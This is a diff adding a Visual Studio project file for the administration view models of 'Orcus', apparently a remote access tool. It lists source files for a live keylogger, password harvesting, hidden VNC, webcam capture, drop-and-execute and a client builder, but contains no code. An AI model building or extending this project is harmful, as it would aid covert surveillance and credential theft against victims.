@@ -1,0 +1,361 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="14.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{8D7E5EB0-C382-4287-837F-7A41A9D6915B}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>Orcus.Administration.ViewModels</RootNamespace>
+    <AssemblyName>Orcus.Administration.ViewModels</AssemblyName>
+    <TargetFrameworkVersion>v4.6.1</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <!-- <Import Project="$(SolutionDir)\Build\Orcus.PreSettings.targets" /> !-->
+  <ItemGroup>
+    <Reference Include="CSCore, Version=1.2.1.2, Culture=neutral, PublicKeyToken=5a08f2b6f4415dea, processorArchitecture=MSIL">
+      <HintPath>..\packages\CSCore.1.2.1.2\lib\net35-client\CSCore.dll</HintPath>
+    </Reference>
+    <Reference Include="Exceptionless.Signed, Version=4.0.1934.0, Culture=neutral, PublicKeyToken=fc181f0a46f65747, processorArchitecture=MSIL">
+      <HintPath>..\packages\Exceptionless.Signed.4.0.1934\lib\net45\Exceptionless.Signed.dll</HintPath>
+    </Reference>
+    <Reference Include="FluentCommandLineParser, Version=1.4.3.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\FluentCommandLineParser.1.4.3\lib\net35\FluentCommandLineParser.dll</HintPath>
+    </Reference>
+    <Reference Include="MahApps.Metro, Version=1.3.0.0, Culture=neutral, PublicKeyToken=f4fb5a3c4d1e5b4f, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\References\MahApps.Metro.dll</HintPath>
+    </Reference>
+    <Reference Include="MahApps.Metro.IconPacks.Material, Version=1.7.1.0, Culture=neutral, PublicKeyToken=851aa33cb9b88f1c, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\References\MahApps.Metro.IconPacks.Material.dll</HintPath>
+    </Reference>
+    <Reference Include="Mono.Cecil, Version=0.9.6.0, Culture=neutral, PublicKeyToken=0738eb9f132ed756, processorArchitecture=MSIL">
+      <HintPath>..\packages\Mono.Cecil.0.9.6.4\lib\net45\Mono.Cecil.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="Mono.Cecil.Mdb, Version=0.9.6.0, Culture=neutral, PublicKeyToken=0738eb9f132ed756, processorArchitecture=MSIL">
+      <HintPath>..\packages\Mono.Cecil.0.9.6.4\lib\net45\Mono.Cecil.Mdb.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="Mono.Cecil.Pdb, Version=0.9.6.0, Culture=neutral, PublicKeyToken=0738eb9f132ed756, processorArchitecture=MSIL">
+      <HintPath>..\packages\Mono.Cecil.0.9.6.4\lib\net45\Mono.Cecil.Pdb.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="Mono.Cecil.Rocks, Version=0.9.6.0, Culture=neutral, PublicKeyToken=0738eb9f132ed756, processorArchitecture=MSIL">
+      <HintPath>..\packages\Mono.Cecil.0.9.6.4\lib\net45\Mono.Cecil.Rocks.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="Newtonsoft.Json, Version=9.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>..\packages\Newtonsoft.Json.9.0.1\lib\net45\Newtonsoft.Json.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="NLog, Version=4.0.0.0, Culture=neutral, PublicKeyToken=5120e14c03d0593c, processorArchitecture=MSIL">
+      <HintPath>..\packages\NLog.4.4.4\lib\net45\NLog.dll</HintPath>
+    </Reference>
+    <Reference Include="nUpdate">
+      <HintPath>..\References\nUpdate\nUpdate.dll</HintPath>
+    </Reference>
+    <Reference Include="Ookii.Dialogs.Wpf, Version=3.0.0.0, Culture=neutral, PublicKeyToken=66aa232afad40158, processorArchitecture=MSIL">
+      <HintPath>..\packages\Ookii.Dialogs.Wpf.3.1.0\lib\net45\Ookii.Dialogs.Wpf.dll</HintPath>
+    </Reference>
+    <Reference Include="OxyPlot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=638079a8f0bd61e9, processorArchitecture=MSIL">
+      <HintPath>..\packages\OxyPlot.Core.1.0.0\lib\net45\OxyPlot.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="OxyPlot.Wpf, Version=1.0.0.0, Culture=neutral, PublicKeyToken=75e952ba404cdbb0, processorArchitecture=MSIL">
+      <HintPath>..\packages\OxyPlot.Wpf.1.0.0\lib\net45\OxyPlot.Wpf.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="PresentationCore" />
+    <Reference Include="PresentationFramework" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Design" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Web" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Windows.Interactivity, Version=4.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL">
+      <HintPath>..\packages\MahApps.Metro.1.3.0\lib\net45\System.Windows.Interactivity.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Xaml" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Xml" />
+    <Reference Include="WindowsBase" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="AboutViewModel.cs" />
+    <Compile Include="About\AudioInfo.cs" />
+    <Compile Include="About\BSDLicenseInfo.cs" />
+    <Compile Include="About\Component.cs" />
+    <Compile Include="About\ImageCreator.cs" />
+    <Compile Include="About\LicenseInfo.cs" />
+    <Compile Include="About\MITLicenseInfo.cs" />
+    <Compile Include="About\Translator.cs" />
+    <Compile Include="ActivityMonitorViewModel.cs" />
+    <Compile Include="ActivityMonitor\BrakingCollectionManager.cs" />
+    <Compile Include="ActivityMonitor\CpuUsageMonitor.cs" />
+    <Compile Include="AddConditionViewModel.cs" />
+    <Compile Include="AddCondition\ClientBinaryFrameworkVersionConditionViewModel.cs" />
+    <Compile Include="AddCondition\ClientTagConditionViewModel.cs" />
+    <Compile Include="AddCondition\ConditionViewModel.cs" />
+    <Compile Include="AddCondition\IConditionViewModel.cs" />
+    <Compile Include="AddCondition\OperatingSystemConditionViewModel.cs" />
+    <Compile Include="AddCondition\PasswordDataAvailableConditionViewModel.cs" />
+    <Compile Include="AddCondition\PrivilegesConditionViewModel.cs" />
+    <Compile Include="AddCondition\VersionConditionViewModel.cs" />
+    <Compile Include="AppSettings\AccentColorViewModel.cs" />
+    <Compile Include="ClientBuilderViewModel.cs" />
+    <Compile Include="ClientBuilder\BuildConfigurationManager.cs" />
+    <Compile Include="ClientBuilder\BuildConfigurationViewModel.cs" />
+    <Compile Include="ClientBuilder\BuilderArguments.cs" />
+    <Compile Include="ClientBuilder\BuilderInformation.cs" />
+    <Compile Include="ClientBuilder\BuilderPluginViewModel.cs" />
+    <Compile Include="ClientBuilder\BuilderPropertyViewModel.cs" />
+    <Compile Include="ClientBuilder\BuilderSettingsManager.cs" />
+    <Compile Include="ClientBuilder\BuilderSettingsOverwrite.cs" />
+    <Compile Include="ClientBuilder\BuilderSettingsOverwriteRequestEventArgs.cs" />
+    <Compile Include="ClientBuilder\ClientPluginViewModel.cs" />
+    <Compile Include="ClientBuilder\OpenPluginSettingsEventArgs.cs" />
+    <Compile Include="ClientBuilder\PluginSettings.cs" />
+    <Compile Include="ClientBuilder\PluginViewModel.cs" />
+    <Compile Include="ClientMapViewModel.cs" />
+    <Compile Include="ClientMap\ClientMarker.cs" />
+    <Compile Include="CommandViewModel.cs" />
+    <Compile Include="CommandViewModels\ActiveConnectionsViewModel.cs" />
+    <Compile Include="CommandViewModels\AudioVolumeControlViewModel.cs" />
+    <Compile Include="CommandViewModels\Audio\AudioPlayer.cs" />
+    <Compile Include="CommandViewModels\AudioViewModel.cs" />
+    <Compile Include="CommandViewModels\ClientCommandsViewModel.cs" />
+    <Compile Include="CommandViewModels\ClientConfigViewModel.cs" />
+    <Compile Include="CommandViewModels\ClientControlViewModel.cs" />
+    <Compile Include="CommandViewModels\ClientPluginsViewModel.cs" />
+    <Compile Include="CommandViewModels\ClientPlugins\PluginPresenter.cs" />
+    <Compile Include="CommandViewModels\ClipboardManagerViewModel.cs" />
+    <Compile Include="CommandViewModels\ClipboardManager\ClipboardEntryViewModel.cs" />
+    <Compile Include="CommandViewModels\ClipboardManager\ClipboardManagerEditViewModel.cs" />
+    <Compile Include="CommandViewModels\CodeViewModel.cs" />
+    <Compile Include="CommandViewModels\ComputerInformationViewModel.cs" />
+    <Compile Include="CommandViewModels\ConsoleViewModel.cs" />
+    <Compile Include="CommandViewModels\DeviceManager\DeviceCategoryViewModel.cs" />
+    <Compile Include="CommandViewModels\DeviceManagerViewModel.cs" />
+    <Compile Include="CommandViewModels\DeviceManager\DeviceViewModel.cs" />
+    <Compile Include="CommandViewModels\DeviceManager\IDeviceEntryViewModel.cs" />
+    <Compile Include="CommandViewModels\DropAndExecuteViewModel.cs" />
+    <Compile Include="CommandViewModels\DropAndExecute\DropAndExecuteState.cs" />
+    <Compile Include="CommandViewModels\EventLogViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\ArchiveOptionsViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\CreateShortcutViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\DirectoryNodeViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\DirectoryTreeViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\Downloader.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\DownloadFileViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\EntryViewModelCommands.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\ExecuteFileViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\FailedEntryDeletionsViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\FileEntryViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\FileExplorerPathComparer.cs" />
+    <Compile Include="CommandViewModels\FileExplorerViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\FileProcessEntryState.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\FileTransferManagerViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\FileTransferTask.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\IEntryViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\IFileSystem.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\ImageProvider.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\PathComparer.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\PathHistoryManager.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\ProcessingEntryViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\PropertiesViewModel.cs" />
+    <Compile Include="CommandViewModels\FileExplorer\RemoteFileSystem.cs" />
+    <Compile Include="CommandViewModels\FunViewModel.cs" />
+    <Compile Include="CommandViewModels\HiddenApplicationViewModel.cs" />
+    <Compile Include="CommandViewModels\HvncViewModel.cs" />
+    <Compile Include="CommandViewModels\LiveKeyloggerViewModel.cs" />
+    <Compile Include="CommandViewModels\LivePerformance\EthernetAdapterViewModel.cs" />
+    <Compile Include="CommandViewModels\LivePerformance\GraphPoint.cs" />
+    <Compile Include="CommandViewModels\LivePerformanceViewModel.cs" />
+    <Compile Include="CommandViewModels\MessageBoxViewModel.cs" />
+    <Compile Include="CommandViewModels\PasswordsViewModel.cs" />
+    <Compile Include="CommandViewModels\Registry\CreateSubKeyViewModel.cs" />
+    <Compile Include="CommandViewModels\Registry\EditValueViewModel.cs" />
+    <Compile Include="CommandViewModels\Registry\RegistryPathComparer.cs" />
+    <Compile Include="CommandViewModels\Registry\RegistryTreeViewModel.cs" />
+    <Compile Include="CommandViewModels\RegistryViewModel.cs" />
+    <Compile Include="CommandViewModels\Registry\SubKeyNodeViewModel.cs" />
+    <Compile Include="CommandViewModels\RemoteDesktopViewModel.cs" />
+    <Compile Include="CommandViewModels\RemoteDesktop\OptionsViewModel.cs" />
+    <Compile Include="CommandViewModels\ReverseProxyViewModel.cs" />
+    <Compile Include="CommandViewModels\StartupManagerViewModel.cs" />
+    <Compile Include="CommandViewModels\SystemRestoreViewModel.cs" />
+    <Compile Include="CommandViewModels\SystemRestore\CreateSystemRestorePointViewModel.cs" />
+    <Compile Include="CommandViewModels\TaskmanagerViewModel.cs" />
+    <Compile Include="CommandViewModels\Taskmanager\ProcessPropertiesViewModel.cs" />
+    <Compile Include="CommandViewModels\TextChatViewModel.cs" />
+    <Compile Include="CommandViewModels\UninstallProgramsViewModel.cs" />
+    <Compile Include="CommandViewModels\UserInteractionViewModel.cs" />
+    <Compile Include="CommandViewModels\VoiceChatViewModel.cs" />
+    <Compile Include="CommandViewModels\VoiceChat\AudioVisualizationDataProvider.cs" />
+    <Compile Include="CommandViewModels\VoiceChat\LocalCaptureDeviceInfo.cs" />
+    <Compile Include="CommandViewModels\WebcamViewModel.cs" />
+    <Compile Include="CommandViewModels\WindowManagerViewModel.cs" />
+    <Compile Include="CommandViewModels\WindowsCustomizerViewModel.cs" />
+    <Compile Include="CommandViewModels\WindowsDriversViewModel.cs" />
+    <Compile Include="CommandViewModels\WindowsDrivers\DriverConfigurationViewModel.cs" />
+    <Compile Include="ComputerInformationViewModel.cs" />
+    <Compile Include="ConfigurationManagerViewModel.cs" />
+    <Compile Include="ConfigureServerViewModel.cs" />
+    <Compile Include="ConnectToServerViewModel.cs" />
+    <Compile Include="ControllerViewModel.cs" />
+    <Compile Include="Controller\IViewManagerModelController.cs" />
+    <Compile Include="CrowdControlCreateTaskViewModel.cs" />
+    <Compile Include="CrowdControlEventsViewModel.cs" />
+    <Compile Include="CrowdControlExecutingClientsViewModel.cs" />
+    <Compile Include="CrowdControlManagePresetsViewModel.cs" />
+    <Compile Include="CrowdControlShortcutSettingsViewModel.cs" />
+    <Compile Include="CrowdControlViewModel.cs" />
+    <Compile Include="CrowdControl\DynamicCommandViewModel.cs" />
+    <Compile Include="DataManagerViewModel.cs" />
+    <Compile Include="DataManager\DataFilter.cs" />
+    <Compile Include="DataManager\DataTypes\FileManagerDirectory.cs" />
+    <Compile Include="DataManager\DataTypes\FileManagerDirectoryOld.cs" />
+    <Compile Include="DataManager\DataTypes\FileManagerFile.cs" />
+    <Compile Include="DataManager\DataTypes\FileManagerKeyLog.cs" />
+    <Compile Include="DataManager\DataTypes\FileManagerPasswords.cs" />
+    <Compile Include="DataManager\DownloadTaskViewModel.cs" />
+    <Compile Include="DataManager\ViewData.cs" />
+    <Compile Include="DownloadViewModel.cs" />
+    <Compile Include="ExceptionDialogViewModel.cs" />
+    <Compile Include="ExceptionsViewModel.cs" />
+    <Compile Include="Extensions\CheckedChangeRequest.cs" />
+    <Compile Include="InputMultilineTextViewModel.cs" />
+    <Compile Include="InputTextViewModel.cs" />
+    <Compile Include="KeyLog\BackKey.cs" />
+    <Compile Include="KeyLog\CapsKey.cs" />
+    <Compile Include="KeyLog\EnterKey.cs" />
+    <Compile Include="KeyLog\KeyControl.cs" />
+    <Compile Include="KeyLog\KeyItem.cs" />
+    <Compile Include="KeyLog\ShiftKey.cs" />
+    <Compile Include="KeyLog\StandardKey.cs" />
+    <Compile Include="KeyLog\TabKey.cs" />
+    <Compile Include="KeyLog\WindowsKey.cs" />
+    <Compile Include="MainViewModel.cs" />
+    <Compile Include="Main\StaticCommandGroup.cs" />
+    <Compile Include="Main\StaticCommandItem.cs" />
+    <Compile Include="PasswordsViewModel.cs" />
+    <Compile Include="PluginsViewModel.cs" />
+    <Compile Include="Plugins\InstalledUnknownPluginViewModel.cs" />
+    <Compile Include="Plugins\IPluginViewModel.cs" />
+    <Compile Include="Plugins\PublicPluginViewModel.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="PropertyGridSettingsViewModel.cs" />
+    <Compile Include="ProxySettingsViewModel.cs" />
+    <Compile Include="SettingsViewModel.cs" />
+    <Compile Include="StatisticsViewModel.cs" />
+    <Compile Include="Statistics\PieSegment.cs" />
+    <Compile Include="UpdateViewModel.cs" />
+    <Compile Include="Utilities\ObservableCollectionExtensions.cs" />
+    <Compile Include="ViewObjects\RangeInfo.cs" />
+    <Compile Include="ViewInterface\ApplicationInterface.cs" />
+    <Compile Include="ViewInterface\IWebServerConnection.cs" />
+    <Compile Include="ViewInterface\IWindow.cs" />
+    <Compile Include="ViewInterface\IWindowServiceInterface.cs" />
+    <Compile Include="ViewInterface\WindowServiceInterface.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\Libraries\OpusWrapper\OpusWrapper.csproj">
+      <Project>{f07d69a2-8847-4ade-b9c6-05345cc8ed5b}</Project>
+      <Name>OpusWrapper</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Libraries\Orcus.Administration.FileExplorer\Orcus.Administration.FileExplorer.csproj">
+      <Project>{AF618573-17DF-46CB-9279-1DD55FBD3132}</Project>
+      <Name>Orcus.Administration.FileExplorer</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Administration.Commands\Orcus.Administration.Commands.csproj">
+      <Project>{917798e0-c646-4616-b6ed-5a2d2ac87ff6}</Project>
+      <Name>Orcus.Administration.Commands</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Administration.Core\Orcus.Administration.Core.csproj">
+      <Project>{6ae72a9e-2f67-4f4d-8d63-7e617f15fbd3}</Project>
+      <Name>Orcus.Administration.Core</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Administration.Plugins\Orcus.Administration.Plugins.csproj">
+      <Project>{bee3b0ea-abae-43f3-a377-763e1a28c967}</Project>
+      <Name>Orcus.Administration.Plugins</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Administration.Resources\Orcus.Administration.Resources.csproj">
+      <Project>{edab83b6-1c32-401f-b241-b065156cbba9}</Project>
+      <Name>Orcus.Administration.Resources</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Plugins\Orcus.Plugins.csproj">
+      <Project>{0d743e5d-0d5f-4b9b-b2df-1f607b5031c4}</Project>
+      <Name>Orcus.Plugins</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Shared.Utilities\Orcus.Shared.Utilities.csproj">
+      <Project>{e23e8c6f-6f71-4954-8a42-fba873b86e5e}</Project>
+      <Name>Orcus.Shared.Utilities</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Shared\Orcus.Shared.csproj">
+      <Project>{4030f3bd-8f20-483b-b87b-c1be34dbebfc}</Project>
+      <Name>Orcus.Shared</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.StaticCommands\Orcus.StaticCommands.csproj">
+      <Project>{8a420d43-c212-4981-8df1-eed79fdea1cf}</Project>
+      <Name>Orcus.StaticCommands</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Sorzus.Wpf.Toolkit\Sorzus.Wpf.Toolkit.csproj">
+      <Project>{bf0e0718-3e64-4246-a17f-594dcf19edfc}</Project>
+      <Name>Sorzus.Wpf.Toolkit</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="packages.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup />
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!--<Import Project="$(SolutionDir)\Build\Orcus.PostSettings.targets" />  -->
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
